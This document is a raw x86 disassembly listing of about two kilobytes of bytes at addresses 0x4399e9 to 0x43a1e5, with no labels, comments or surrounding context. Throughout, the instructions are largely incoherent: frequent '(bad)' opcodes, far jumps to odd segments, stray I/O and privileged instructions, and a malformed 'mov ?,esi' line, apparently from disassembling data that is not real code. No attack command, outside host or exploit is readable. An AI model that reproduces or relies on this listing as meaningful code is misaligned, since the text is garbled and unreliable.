  4399e9:	minps  xmm7,xmm7
  4399ec:	cmp    edi,0x29
  4399ef:	add    BYTE PTR [eax+0xff8373],bl
  4399f5:	and    DWORD PTR [ebx],0x74
  4399f8:	fs loopne 0x439a39
  4399fb:	add    BYTE PTR [eax],al
  4399fd:	add    BYTE PTR [eax+0x2dad00],al
  439a03:	inc    DWORD PTR [eax]
  439a05:	(bad)  
  439a06:	mov    ecx,0x99c89243
  439a0b:	add    bh,bh
  439a0d:	and    ecx,0xffffff89
  439a10:	adc    al,0xe6
  439a12:	inc    DWORD PTR [eax]
  439a14:	(bad)  
  439a15:	call   DWORD PTR [edx+0x218cb73f]
  439a1b:	inc    DWORD PTR [eax]
  439a1d:	inc    DWORD PTR [ebp-0x1]
  439a20:	ss cmp edi,edi
  439a23:	mov    edi,edi
  439a25:	and    ebx,0x43
  439a28:	cld    
  439a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439a2a:	xchg   esp,eax
  439a2b:	cmp    edi,0xffffff83
  439a2e:	mov    bh,0xff
  439a30:	jmp    0x1429a3d
  439a35:	adc    DWORD PTR [edi],0xffffffe1
  439a38:	sub    al,0xcb
  439a3a:	xchg   ebx,eax
  439a3b:	add    bh,bh
  439a3d:	call   DWORD PTR [ebx+0x0]
  439a40:	xchg   esi,eax
  439a41:	sbb    edi,edi
  439a43:	add    bh,bh
  439a45:	inc    esp
  439a47:	imul   edi,DWORD PTR [eax-0xc],0xcc8383c1
  439a4e:	xor    BYTE PTR [ebx+0xffda63],al
  439a54:	mov    DWORD PTR [ebx-0x540e76d4],eax
  439a5a:	push   ecx
  439a5b:	inc    DWORD PTR [eax]
  439a5d:	add    BYTE PTR [ebx+0xec7bff],ch
  439a63:	add    BYTE PTR [eax],al
  439a65:	jmp    edi
  439a67:	outs   dx,BYTE PTR ds:[esi]
  439a68:	and    al,0xfb
  439a6a:	je     0x439a6c
  439a6c:	(bad)  
  439a6d:	(bad)  
  439a6e:	in     eax,dx
  439a6f:	dec    DWORD PTR [edx]
  439a71:	js     0x439a72
  439a73:	(bad)  
  439a74:	inc    DWORD PTR [eax]
  439a76:	mov    edx,0x533aa04
  439a7b:	(bad)  
  439a7c:	(bad)  
  439a7d:	dec    DWORD PTR [eax+0xe5d5ff]
  439a83:	(bad)  
  439a84:	inc    DWORD PTR [ebx+0x738d1ddd]
  439a8a:	mov    DWORD PTR [eax],0x83a70000
  439a90:	mov    al,ds:0xffff2f
  439a95:	xor    DWORD PTR [eax],0x74
  439a98:	mov    WORD PTR [esi-0x6a],ds
  439a9b:	add    DWORD PTR [ebx+0x40004500],0xffffff96
  439aa2:	(bad)  
  439aa3:	dec    DWORD PTR [ecx+0x698dd983]
  439aa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439aaa:	jle    0x439a35
  439aac:	dec    DWORD PTR [ecx-0x28fc000d]
  439ab2:	cmp    edi,0xffffffcc
  439ab5:	sbb    DWORD PTR [eax],0xfffffff4
  439ab8:	retf   
  439ab9:	and    al,0xc2
  439abb:	(bad)  
  439abc:	(bad)  
  439abd:	(bad)  
  439abe:	jmp    0x439a43
  439ac0:	cmc    
  439ac1:	and    al,BYTE PTR [eax]
  439ac3:	inc    DWORD PTR [eax]
  439ac5:	(bad)  
  439ac6:	js     0x439b10
  439ac8:	cld    
  439ac9:	xchg   DWORD PTR [esp+ecx*8+0xe1ffff],esp
  439ad0:	mov    ?,esi
  439ad2:	(bad)  
  439ad3:	dec    esp
  439ad5:	sub    DWORD PTR [edi+0x2],0xffffff81
  439ad9:	pop    ebp
  439ada:	push   ebp
  439adb:	mov    esp,ecx
  439add:	and    DWORD PTR [ebx-0x34],0xfffffffd
  439ae1:	xchg   esi,eax
  439ae2:	add    bh,bh
  439ae4:	mov    edi,edi
  439ae6:	cmp    eax,DWORD PTR [edx-0x18]
  439ae9:	push   ecx
  439aea:	mov    BYTE PTR [ecx-0x7ccc007d],cl
  439af0:	mov    bh,0xe3
  439af2:	(bad)  
  439af3:	(bad)  
  439af4:	(bad)  
  439af5:	jmp    FWORD PTR [eax+0x123d9b7]
  439afb:	add    DWORD PTR [eax],0xffffff83
  439afe:	mov    al,0xff
  439b00:	pop    ebx
  439b01:	dec    ecx
  439b02:	cmp    edi,0x0
  439b05:	add    BYTE PTR [ebx-0x7c62713c],ah
  439b0b:	(bad)  
  439b0c:	dec    esp
  439b0e:	push   es
  439b0f:	add    BYTE PTR [edx-0x27],ch
  439b15:	push   edx
  439b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439b18:	and    al,0x60
  439b1a:	inc    eax
  439b1b:	inc    DWORD PTR [ebx-0x34ffc101]
  439b21:	idiv   bh
  439b23:	add    BYTE PTR [ecx-0x4df65e00],cl
  439b29:	loopne 0x439abd
  439b2b:	inc    DWORD PTR [ebx-0x5f00e501]
  439b31:	sub    edi,edi
  439b33:	add    bh,bh
  439b35:	add    BYTE PTR ds:0x3b38a107,bl
  439b3b:	(bad)  
  439b3c:	(bad)  
  439b3d:	push   DWORD PTR [edi-0x8eac00]
  439b43:	(bad)  
  439b44:	inc    DWORD PTR [eax]
  439b46:	xchg   edi,eax
  439b47:	adc    ecx,DWORD PTR [ebp-0x1a]
  439b4a:	or     DWORD PTR [ecx-0x8a7d00],0x1d
  439b51:	cmp    eax,0xccffffff
  439b56:	retf   0xb012
  439b59:	dec    ecx
  439b5a:	icebp  
  439b5b:	inc    DWORD PTR [eax]
  439b5d:	add    BYTE PTR [ebx+0x0],bh
  439b60:	in     al,0xcb
  439b62:	dec    esp
  439b64:	inc    DWORD PTR [ebx-0x7c7c670c]
  439b6a:	mov    edi,0x3affff00
  439b6f:	add    BYTE PTR [edi-0x5c],bh
  439b72:	inc    DWORD PTR [eax]
  439b74:	(bad)  
  439b75:	push   DWORD PTR [esp+esi*4]
  439b78:	cs int 0x53
  439b7b:	inc    DWORD PTR [eax]
  439b7d:	inc    DWORD PTR [ebx+0x0]
  439b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439b81:	jg     0x439b82
  439b83:	cmp    edi,0xffffffff
  439b86:	sbb    DWORD PTR [edx-0x76e0d6],ebx
  439b8c:	add    ah,cl
  439b8e:	jo     0x439b13
  439b90:	mov    ds:0x83ffad,al
  439b95:	mov    DWORD PTR [ebx+0xdea8661],ebp
  439b9b:	int3   
  439b9c:	(bad)  
  439b9d:	jmp    FWORD PTR [edi-0x332fa001]
  439ba3:	add    BYTE PTR [eax],al
  439ba5:	dec    DWORD PTR [edx-0x100030a8]
  439bab:	(bad)  
  439bac:	inc    DWORD PTR [eax]
  439bae:	cmp    al,BYTE PTR [eax]
  439bb0:	scas   eax,DWORD PTR es:[edi]
  439bb1:	jl     0x439bb2
  439bb3:	int3   
  439bb4:	(bad)  
  439bb5:	jmp    edx
  439bb7:	mov    DWORD PTR [ecx+0x7c],ecx
  439bba:	jp     0x439b3f
  439bbc:	(bad)  
  439bbd:	push   DWORD PTR [ecx]
  439bbf:	dec    DWORD PTR [edi-0x331b]
  439bc5:	add    bl,dl
  439bc7:	idiv   DWORD PTR [ecx]
  439bc9:	pop    esp
  439bca:	push   0xffffffff
  439bcc:	add    bh,bh
  439bce:	das    
  439bcf:	call   DWORD PTR [edi-0x7cff7cf2]
  439bd5:	call   DWORD PTR [ecx]
  439bd7:	cli    
  439bd8:	retf   
  439bd9:	or     eax,0x89008966
  439bde:	push   ebx
  439bdf:	add    BYTE PTR [eax],al
  439be1:	push   ss
  439be2:	cmp    edi,0xffffffff
  439be5:	(bad)  
  439be6:	jmp    0x83:0x91829fd1
  439bed:	inc    DWORD PTR [edi]
  439bef:	call   edi
  439bf1:	add    eax,DWORD PTR [eax]
  439bf3:	add    BYTE PTR [ebx-0x68cac301],al
  439bf9:	mov    bl,0x25
  439bfb:	(bad)  
  439bfc:	inc    DWORD PTR [ebx-0x2a42001e]
  439c02:	add    bh,bh
  439c04:	int3   
  439c05:	dec    DWORD PTR [esi]
  439c07:	(bad)  
  439c08:	gs sti 
  439c0a:	enter  0xff83,0x0
  439c0e:	add    BYTE PTR [eax],0x14
  439c11:	outs   dx,BYTE PTR ds:[esi]
  439c12:	add    ah,cl
  439c14:	(bad)  
  439c15:	jmp    FWORD PTR [ecx-0x775a66c5]
  439c1b:	add    BYTE PTR [eax],al
  439c1d:	add    BYTE PTR [eax+0x9bae89],ah
  439c23:	cmp    edi,0xffffffff
  439c26:	fild   DWORD PTR [ebx]
  439c28:	xchg   esp,eax
  439c29:	test   al,0xb6
  439c2b:	add    bh,bh
  439c2d:	and    esi,0xffffff83
  439c30:	je     0x439bc1
  439c32:	add    bh,bh
  439c34:	inc    DWORD PTR [ebx+0x1c104376]
  439c3a:	and    al,0x0
  439c3c:	add    BYTE PTR [ecx-0x1b54ff9e],cl
  439c42:	cmp    edi,0xffffffff
  439c45:	jmp    FWORD PTR [edx+0x10079802]
  439c4b:	or     DWORD PTR [ecx-0x2effcb01],0x1d
  439c52:	add    bh,bh
  439c54:	(bad)  
  439c55:	jmp    DWORD PTR [ebx+0x49]
  439c58:	pop    esi
  439c59:	test   eax,0xff0083ad
  439c5e:	(bad)  
  439c61:	mov    ds:0xffff89,eax
  439c66:	inc    ebx
  439c67:	mov    esp,0xc78ef
  439c6c:	add    DWORD PTR [eax],0xffffff81
  439c6f:	add    edx,0xffffffa8
  439c72:	cmp    edi,0xffffffff
  439c75:	(bad)  
  439c76:	fiadd  DWORD PTR [ecx-0x1df611]
  439c7c:	int3   
  439c7d:	int3   
  439c7e:	popa   
  439c7f:	mov    DWORD PTR [eax+0x2c],edi
  439c82:	add    DWORD PTR [eax],0xffffffff
  439c85:	(bad)  
  439c86:	in     al,dx
  439c87:	pop    ds
  439c88:	jne    0x439c9e
  439c8a:	jnp    0x439c8c
  439c8c:	add    bh,bh
  439c8e:	ins    DWORD PTR es:[edi],dx
  439c8f:	call   FWORD PTR [edx+0x6c]
  439c92:	(bad)  
  439c93:	(bad)  
  439c94:	dec    DWORD PTR [ecx+0x1bd84572]
  439c9a:	push   edi
  439c9b:	(bad)  
  439c9c:	inc    DWORD PTR [ebx+0x3a300037]
  439ca2:	inc    DWORD PTR [eax]
  439ca4:	mov    edi,edi
  439ca6:	jns    0x439cfb
  439ca8:	dec    esp
  439ca9:	fcmovb st,st(0)
  439cab:	(bad)  
  439cac:	inc    DWORD PTR [eax]
  439cae:	test   al,0x0
  439cb0:	jl     0x439cb9
  439cb2:	mov    edi,edi
  439cb4:	add    bh,bh
  439cb6:	and    dh,dh
  439cb8:	int3   
  439cb9:	adc    al,0xaa
  439cbb:	(bad)  
  439cbc:	(bad)  
  439cbd:	push   ebx
  439cbf:	add    BYTE PTR [ebx],dl
  439cc1:	mov    edi,edi
  439cc3:	int3   
  439cc4:	add    BYTE PTR [ebx+0x3c2c3bfe],al
  439cca:	xchg   ebx,eax
  439ccb:	add    DWORD PTR [eax],0xffffffff
  439cce:	test   edi,edi
  439cd0:	cs ret 
  439cd2:	inc    DWORD PTR [ebx+0x27bdffff]
  439cd8:	stos   BYTE PTR es:[edi],al
  439cd9:	mov    edx,0xffff95
  439cde:	in     eax,0x83
  439ce0:	repz loope 0x439ce2
  439ce3:	inc    DWORD PTR [ebx+0x1f4c2b00]
  439ce9:	popf   
  439cea:	cmp    al,0x89
  439cec:	(bad)  
  439ced:	push   DWORD PTR [ebp-0x7d]
  439cf0:	stc    
  439cf1:	mov    BYTE PTR [ebx+0x3effff00],al
  439cf7:	adc    eax,0x838f6dc7
  439cfc:	add    bh,bh
  439cfe:	and    al,0xff
  439d00:	in     eax,dx
  439d01:	sub    ah,cl
  439d03:	inc    DWORD PTR [eax]
  439d05:	sbb    DWORD PTR [eax],0x64
  439d08:	fnstsw WORD PTR [ecx-0x29]
  439d0b:	add    bh,bh
  439d0d:	(bad)  
  439d0e:	mov    ebp,0xff941500
  439d13:	inc    DWORD PTR [ebx+0xaf4ba83]
  439d19:	sbb    DWORD PTR [eax],eax
  439d1b:	inc    DWORD PTR [eax]
  439d1d:	and    DWORD PTR [ebp-0x3fd634],0xffffffff
  439d24:	add    bh,bh
  439d26:	js     0x439d9b
  439d28:	pop    ds
  439d29:	push   edi
  439d2a:	aad    0xcc
  439d2c:	dec    DWORD PTR [ecx-0x5a727cb6]
  439d32:	(bad)  
  439d33:	(bad)  
  439d34:	dec    DWORD PTR [ecx+0x6809fb8]
  439d3a:	out    0x89,al
  439d3c:	(bad)  
  439d3d:	dec    DWORD PTR ds:0xd4c9ff
  439d43:	cmp    edi,0xffffffff
  439d46:	cli    
  439d47:	icebp  
  439d48:	add    eax,0xff00914f
  439d4d:	add    BYTE PTR ds:0xff61b1ff,bh
  439d53:	dec    DWORD PTR [ecx-0x75d23200]
  439d59:	dec    edi
  439d5a:	mov    dl,0xff
  439d5c:	add    BYTE PTR [eax],al
  439d5e:	mov    WORD PTR [eax],es
  439d60:	(bad)  
  439d61:	jns    0x439d62
  439d63:	add    bh,bh
  439d65:	call   FWORD PTR [ecx-0x1c]
  439d68:	cmp    BYTE PTR [ebp-0xffff19],bl
  439d6e:	pop    ds
  439d6f:	call   esi
  439d71:	pop    ebp
  439d72:	add    bh,bh
  439d74:	or     DWORD PTR [ecx+0x192e1554],0xffffffe7
  439d7b:	(bad)  
  439d7c:	inc    DWORD PTR [eax]
  439d7e:	and    eax,0xa10600
  439d83:	mov    edi,edi
  439d85:	dec    DWORD PTR [edx+0x4]
  439d88:	push   edx
  439d89:	in     eax,0xe9
  439d8b:	dec    DWORD PTR [ecx+0x64ffedff]
  439d91:	scas   al,BYTE PTR es:[edi]
  439d92:	inc    DWORD PTR [eax]
  439d94:	inc    DWORD PTR [eax]
  439d96:	jl     0x439deb
  439d98:	adc    BYTE PTR [ecx-0x767c30],cl
  439d9e:	cwde   
  439d9f:	call   FWORD PTR [ebx+eiz*1-0x34]
  439da3:	dec    esp
  439da5:	int3   
  439da6:	jo     0x439e12
  439da8:	pop    ss
  439da9:	repz push ds
  439dab:	add    bh,bh
  439dad:	(bad)  
  439dae:	fiadd  WORD PTR [eax]
  439db0:	or     eax,0x8383ff5f
  439db5:	call   FWORD PTR [ecx+0x42]
  439db8:	or     eax,0xffccf181
  439dbd:	add    BYTE PTR [ebx+0x0],cl
  439dc0:	sbb    al,0x76
  439dc2:	inc    DWORD PTR [ebx-0x48060000]
  439dc8:	mov    ch,cl
  439dca:	mov    edx,0x52ffff00
  439dcf:	push   DWORD PTR [esi+eax*4]
  439dd2:	add    ah,cl
  439dd4:	mov    edi,edi
  439dd6:	mov    bl,0x20
  439dd8:	adc    DWORD PTR [esi],edi
  439dda:	int3   
  439ddb:	add    BYTE PTR [eax],al
  439ddd:	push   DWORD PTR ds:0x83cccf83
  439de3:	mov    edi,edi
  439de5:	push   DWORD PTR [edi]
  439de7:	mov    al,BYTE PTR ds:0xffff1c65
  439ded:	jmp    DWORD PTR [ebp-0x3389d000]
  439df3:	add    bh,bh
  439df5:	push   DWORD PTR [eax+ebx*8+0xc9462c]
  439dfc:	add    bh,bh
  439dfe:	pop    eax
  439dff:	jmp    FWORD PTR [edx]
  439e01:	add    DWORD PTR [ebx-0x49003301],0x18
  439e08:	cld    
  439e09:	mov    esp,DWORD PTR [ebx]
  439e0b:	(bad)  
  439e0c:	(bad)  
  439e0d:	jmp    DWORD PTR [edi-0x1]
  439e10:	bnd jne 0x439e12
  439e13:	inc    DWORD PTR [eax]
  439e15:	add    bl,cl
  439e17:	jmp    FWORD PTR [ecx-0xffac5d]
  439e1d:	inc    DWORD PTR [eax+eax*1]
  439e20:	xchg   ecx,eax
  439e21:	gs int3 
  439e23:	inc    DWORD PTR [eax]
  439e25:	mov    DWORD PTR [ebx],esp
  439e27:	sbb    dl,al
  439e29:	inc    esi
  439e2a:	cmp    al,BYTE PTR [eax]
  439e2c:	add    bh,bh
  439e2e:	mov    ebp,0xff193a00
  439e33:	add    bh,bh
  439e35:	or     DWORD PTR [edx+0x63],0x66
  439e39:	outs   dx,DWORD PTR ds:[esi]
  439e3a:	mov    es,WORD PTR [ebx-0xf40034]
  439e40:	in     eax,0x85
  439e42:	int3   
  439e43:	add    bh,bh
  439e45:	int3   
  439e46:	jg     0x439e9d
  439e48:	jp     0x439e7c
  439e4a:	int    0xff
  439e4c:	inc    DWORD PTR [eax]
  439e4e:	pop    edi
  439e4f:	add    BYTE PTR [ecx-0x19],al
  439e52:	(bad)  
  439e53:	inc    DWORD PTR [eax]
  439e55:	mov    DWORD PTR [edx+0x4c99ca6b],esi
  439e5b:	(bad)  
  439e5c:	(bad)  
  439e5d:	call   FWORD PTR [edi+edi*8]
  439e60:	adc    eax,0xff2e
  439e65:	adc    DWORD PTR [edx-0x3],0xffffffd5
  439e69:	test   eax,0xffff2b
  439e6e:	stc    
  439e6f:	dec    eax
  439e71:	inc    edi
  439e72:	or     esp,0xffffffff
  439e75:	dec    DWORD PTR [ecx-0x74ee3d6f]
  439e7b:	(bad)  
  439e7c:	inc    DWORD PTR [eax]
  439e7e:	mov    bh,bh
  439e80:	sti    
  439e81:	mov    edi,0xff0000
  439e86:	push   0x1f
  439e88:	stos   DWORD PTR es:[edi],eax
  439e89:	stos   DWORD PTR es:[edi],eax
  439e8a:	nop
  439e8b:	(bad)  
  439e8c:	inc    DWORD PTR [eax]
  439e8e:	dec    eax
  439e8f:	dec    DWORD PTR [eax+0x17]
  439e92:	add    bh,bh
  439e94:	add    DWORD PTR [eax],0x21
  439e97:	xor    cl,bh
  439e99:	and    BYTE PTR [edi+edi*8+0xd483ff],dh
  439ea0:	scas   eax,DWORD PTR es:[edi]
  439ea1:	or     edi,edi
  439ea3:	(bad)  
  439ea4:	(bad)  
  439ea5:	inc    edi
  439ea7:	xchg   DWORD PTR [edi-0x17],edx
  439eaa:	dec    esi
  439eab:	inc    DWORD PTR [eax]
  439ead:	(bad)  
  439eae:	jl     0x439eaf
  439eb0:	jno    0x439f18
  439eb2:	int3   
  439eb3:	(bad)  
  439eb4:	(bad)  
  439eb5:	call   DWORD PTR [ecx-0x59]
  439eb8:	adc    al,0x66
  439eba:	sbb    eax,DWORD PTR [ebx-0x990077]
  439ec0:	sbb    DWORD PTR [ecx-0x330001],eax
  439ec6:	or     eax,0xf63d90bb
  439ecb:	inc    DWORD PTR [eax]
  439ecd:	add    DWORD PTR [esi-0x76fdc57d],0xffffffff
  439ed4:	add    BYTE PTR [ebx+0x1940c3e],al
  439eda:	sbb    edi,edi
  439edc:	int3   
  439edd:	xor    DWORD PTR [eax+0xc3dd00],0x0
  439ee4:	add    bh,bh
  439ee6:	je     0x439f25
  439ee8:	sbb    BYTE PTR [ebp-0x45],ah
  439eeb:	int3   
  439eec:	inc    DWORD PTR [eax]
  439eee:	cmp    bh,bh
  439ef0:	aaa    
  439ef1:	outs   dx,DWORD PTR ds:[esi]
  439ef2:	inc    DWORD PTR [eax]
  439ef4:	add    bh,bh
  439ef6:	outs   dx,DWORD PTR ds:[esi]
  439ef7:	xor    edx,DWORD PTR [ebx*2-0xc7]
  439efe:	sub    DWORD PTR [eax],eax
  439f00:	stos   BYTE PTR es:[edi],al
  439f01:	mov    edi,edi
  439f03:	add    BYTE PTR [eax],al
  439f05:	mov    DWORD PTR [eax-0x1e],ebp
  439f08:	sub    eax,DWORD PTR [ecx+0x1e]
  439f0b:	inc    DWORD PTR [eax]
  439f0d:	add    BYTE PTR [edx+0x411b00],bl
  439f13:	add    BYTE PTR [eax],al
  439f15:	jmp    DWORD PTR [ebp+0x5]
  439f18:	(bad)  
  439f1a:	inc    BYTE PTR [eax]
  439f1c:	mov    DWORD PTR [ebx-0x4e88ff7e],eax
  439f22:	dec    DWORD PTR [ecx+0x6accff00]
  439f28:	jl     0x439ed1
  439f2a:	inc    BYTE PTR [ebx-0x6cff01]
  439f30:	rol    DWORD PTR ds:[eax],1
  439f33:	(bad)  
  439f34:	inc    DWORD PTR [eax]
  439f36:	mov    esp,DWORD PTR [ebx]
  439f38:	xchg   edx,eax
  439f39:	fdivr  DWORD PTR [eax]
  439f3b:	add    BYTE PTR [ebx+0x4700deff],al
  439f41:	iret   
  439f42:	add    bh,bh
  439f44:	(bad)  
  439f45:	(bad)  
  439f46:	out    dx,eax
  439f47:	push   edi
  439f48:	mov    bh,0x5b
  439f4a:	outs   dx,DWORD PTR ds:[esi]
  439f4b:	add    BYTE PTR [ebx+0x4a83ea00],al
  439f51:	jne    0x439f52
  439f53:	inc    DWORD PTR [eax]
  439f55:	xor    DWORD PTR ds:0xe299bde5,0xffffffff
  439f5c:	inc    DWORD PTR [eax]
  439f5e:	sub    bh,bh
  439f60:	cmp    BYTE PTR [esi-0x1],dh
  439f63:	add    BYTE PTR [ebx+0x7a3d1400],al
  439f69:	push   edi
  439f6a:	xchg   ebx,eax
  439f6b:	(bad)  
  439f6c:	inc    DWORD PTR [ebx+0x291083b2]
  439f72:	dec    esp
  439f74:	cmp    edi,0x44
  439f77:	sub    DWORD PTR ds:0xffff77d7,0xffffffff
  439f7e:	xor    al,0xff
  439f80:	mov    esi,0xffff00bd
  439f85:	add    BYTE PTR [ebx],cl
  439f87:	call   0x0:0xffd2542c
  439f8e:	pushf  
  439f8f:	jmp    DWORD PTR [edx+0x24]
  439f92:	(bad)  
  439f93:	inc    DWORD PTR [ebx-0x40e8f601]
  439f99:	iret   
  439f9a:	push   edi
  439f9b:	add    DWORD PTR [ebx-0x5e00e101],0xf
  439fa2:	inc    DWORD PTR [eax]
  439fa4:	cmp    edi,0x40
  439fa7:	test   BYTE PTR [edx],bh
  439fa9:	ficom  WORD PTR [ecx+0x6cff8383]
  439faf:	dec    DWORD PTR [eax]
  439fb1:	ins    DWORD PTR es:[edi],dx
  439fb2:	add    BYTE PTR [ebx-0x258e0100],al
  439fb8:	sbb    BYTE PTR [eax+ecx*2-0x35010000],dl
  439fbf:	push   ebp
  439fc1:	retf   
  439fc2:	add    BYTE PTR [eax],al
  439fc4:	add    bh,bh
  439fc6:	push   ds
  439fc7:	dec    eax
  439fc8:	jmp    0x4389:0xff005427
  439fcf:	jmp    FWORD PTR [ecx+eax*4-0x1]
  439fd3:	add    BYTE PTR [eax],al
  439fd5:	dec    DWORD PTR [ecx+0x6a]
  439fd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439fd9:	jl     0x439fec
  439fdb:	add    BYTE PTR [eax],al
  439fdd:	add    bl,ch
  439fdf:	add    DWORD PTR [esi*8-0x7c330100],0x37
  439fe7:	ins    BYTE PTR es:[edi],dx
  439fe8:	in     eax,dx
  439fe9:	fist   WORD PTR [eax-0x19330100]
  439fef:	add    al,cl
  439ff1:	mov    bh,bh
  439ff3:	dec    DWORD PTR [ecx+0x51816600]
  439ff9:	repz test eax,0xe4ff83ff
  439fff:	jmp    DWORD PTR [eax-0x33003d]
  43a005:	add    BYTE PTR [ebp-0x36bfb5b9],dh
  43a00b:	add    BYTE PTR [eax],al
  43a00d:	push   DWORD PTR [ebp+0x0]
  43a010:	xor    BYTE PTR [eax],0xcc
  43a013:	(bad)  
  43a014:	inc    DWORD PTR [ebx-0x7092f85b]
  43a01a:	sbb    eax,DWORD PTR [ebx-0x761a0100]
  43a020:	sbb    edi,esp
  43a022:	cmp    edi,0x0
  43a025:	jmp    FWORD PTR [eax]
  43a027:	dec    ecx
  43a028:	dec    ebx
  43a029:	add    dh,BYTE PTR [ebp+0x5b00ff00]
  43a02f:	(bad)  
  43a030:	mov    edx,0x89ff97
  43a035:	cmp    DWORD PTR [esi-0x26537ff2],0xffffffff
  43a03c:	inc    DWORD PTR [ebx+0x2e8a00f5]
  43a042:	add    bh,bh
  43a044:	(bad)  
  43a045:	call   DWORD PTR [esi-0x5b4af1fd]
  43a04b:	(bad)  
  43a04c:	inc    DWORD PTR [ebx-0x7c0e00a7]
  43a052:	add    BYTE PTR [ebx+0x7f2fff89],al
  43a058:	dec    ebp
  43a059:	js     0x439ff6
  43a05b:	inc    DWORD PTR [ebx-0x733dd01]
  43a061:	sbb    bh,bh
  43a063:	add    DWORD PTR [eax],0xffffffff
  43a066:	retf   
  43a067:	inc    eax
  43a068:	jo     0x43a073
  43a06a:	and    edi,edi
  43a06c:	add    bh,bh
  43a06e:	jo     0x43a070
  43a070:	int3   
  43a071:	out    0x83,eax
  43a073:	add    BYTE PTR [eax],bl
  43a075:	mov    bl,0xff
  43a077:	jle    0x43a079
  43a079:	inc    ebp
  43a07a:	(bad)  
  43a07b:	call   DWORD PTR [eax]
  43a07d:	ins    BYTE PTR es:[edi],dx
  43a07e:	int3   
  43a07f:	call   0x8442aa83
  43a084:	inc    esi
  43a085:	ret    
  43a086:	dec    DWORD PTR [eax-0x7d]
  43a089:	cmp    eax,DWORD PTR [eax]
  43a08b:	add    BYTE PTR [esi+0x7f],cl
  43a08e:	inc    DWORD PTR [ebx-0x1]
  43a091:	test   DWORD PTR [eax],0xffdc82ff
  43a097:	mov    al,ds:0xff8dff
  43a09c:	sti    
  43a09d:	push   ds
  43a09e:	(bad)  
  43a09f:	fcos   
  43a0a1:	lock inc DWORD PTR [eax]
  43a0a4:	cmp    bl,BYTE PTR [ecx+0x0]
  43a0a7:	pop    esi
  43a0a8:	mov    DWORD PTR [edx+0x5bee8983],esi
  43a0ae:	jmp    ebx
  43a0b0:	adc    DWORD PTR [ebp-0x1],0xffffffff
  43a0b4:	loop   0x43a064
  43a0b6:	add    BYTE PTR [ebp-0xff0277],bl
  43a0bc:	adc    DWORD PTR ds:0x31839bcc,esi
  43a0c2:	(bad)  
  43a0c3:	push   edx
  43a0c5:	leave  
  43a0c6:	call   FWORD PTR [ebx-0x1]
  43a0c9:	mov    ah,0xff
  43a0cb:	int3   
  43a0cc:	and    DWORD PTR [esi+0x268335ff],ebp
  43a0d2:	mov    DWORD PTR [eax],eax
  43a0d4:	cmp    bl,bl
  43a0d6:	inc    DWORD PTR [ebp-0x7cda01]
  43a0dc:	aas    
  43a0dd:	add    eax,0x1d0022ff
  43a0e2:	(bad)  
  43a0e3:	push   DWORD PTR [edx+0x60]
  43a0e6:	call   FWORD PTR [edi]
  43a0e8:	add    cl,cl
  43a0ea:	(bad)  
  43a0eb:	dec    DWORD PTR [eax]
  43a0ed:	in     eax,dx
  43a0ee:	xor    DWORD PTR [eax+0x891c00],0x4b
  43a0f5:	jae    0xd2a038
  43a0fb:	push   DWORD PTR [eax+0x28]
  43a0fe:	jmp    FWORD PTR [ebp+0x9700]
  43a104:	mov    DWORD PTR [edi+edi*8],eax
  43a107:	pop    ss
  43a108:	jmp    ecx
  43a10a:	inc    DWORD PTR [eax]
  43a10c:	cmc    
  43a10d:	stos   BYTE PTR es:[edi],al
  43a10e:	add    DWORD PTR [esi-0x33006600],0xffffffda
  43a115:	add    al,0x0
  43a117:	aam    0xff
  43a119:	(bad)  
  43a11a:	(bad)  
  43a11b:	jmp    FWORD PTR [edi-0xbdff81]
  43a121:	sar    edi,0xff
  43a124:	mov    ch,0xbd
  43a126:	add    BYTE PTR [edx],al
  43a128:	add    bh,al
  43a12a:	(bad)  
  43a12b:	(bad)  
  43a12c:	jnp    0x43a0ae
  43a12e:	(bad)  
  43a12f:	fld    DWORD PTR [ebx+0x63ffffe6]
  43a135:	mov    ds:0xc4ff7400,eax
  43a13a:	mov    edi,edi
  43a13c:	imul   edi,DWORD PTR [edi],0xffffffff
  43a13f:	mov    dh,0x0
  43a141:	push   ebp
  43a142:	(bad)  
  43a143:	inc    ebx
  43a145:	sar    edi,0xc6
  43a148:	dec    DWORD PTR [esi-0x1]
  43a14b:	add    BYTE PTR [ebx-0xfeff25],bl
  43a151:	sub    al,BYTE PTR [eax]
  43a153:	push   edx
  43a155:	clc    
  43a156:	add    BYTE PTR [eax],dh
  43a158:	jmp    FWORD PTR [edi+0x727b0083]
  43a15e:	jmp    FWORD PTR [ebx-0x7d]
  43a161:	push   cs
  43a162:	(bad)  
  43a163:	call   DWORD PTR [edi-0xd4ffe3]
  43a169:	stc    
  43a16a:	cmp    edi,0xffffffed
  43a16d:	mov    esi,0x14ff7d00
  43a172:	int3   
  43a173:	mov    DWORD PTR [edi],esi
  43a175:	push   ebp
  43a176:	inc    DWORD PTR [ebx+0xffa189]
  43a17c:	(bad)  
  43a17f:	call   0x42fd84
  43a184:	xlat   BYTE PTR ds:[ebx]
  43a185:	dec    edx
  43a186:	add    ecx,0xffffff83
  43a189:	sbb    eax,0x21c7ffff
  43a18e:	int3   
  43a18f:	xor    eax,0x8900c500
  43a194:	mov    ebx,0x8354fffe
  43a199:	pushf  
  43a19a:	int3   
  43a19b:	add    DWORD PTR [edx+ecx*2+0x0],0xffffffb3
  43a1a0:	jmp    DWORD PTR [eax-0x77]
  43a1a3:	add    BYTE PTR [ebx-0x35],ch
  43a1a6:	add    bh,cl
  43a1a8:	add    BYTE PTR [edi+edi*8],al
  43a1ab:	add    BYTE PTR [esp+ebx*2+0x6200c0ff],cl
  43a1b2:	or     esp,0xffffffde
  43a1b5:	jb     0x43a183
  43a1b7:	(bad)  
  43a1b8:	(bad)  
  43a1b9:	fcos   
  43a1bb:	int3   
  43a1bc:	dec    eax
  43a1bd:	xchg   BYTE PTR [eax],al
  43a1bf:	xor    BYTE PTR [eax],al
  43a1c1:	nop
  43a1c2:	inc    DWORD PTR [eax]
  43a1c4:	sti    
  43a1c5:	loop   0x43a1c6
  43a1c7:	imul   eax,DWORD PTR [eax],0x6689ffce
  43a1cd:	ret    0xdaff
  43a1d0:	call   DWORD PTR [edx]
  43a1d2:	add    BYTE PTR [ebx+0x1ffa270],al
  43a1d8:	call   DWORD PTR [eax-0x74400001]
  43a1de:	int3   
  43a1df:	cli    
  43a1e0:	mov    DWORD PTR [edi-0x34],esp
  43a1e3:	add    al,al
  43a1e5:	push   edi
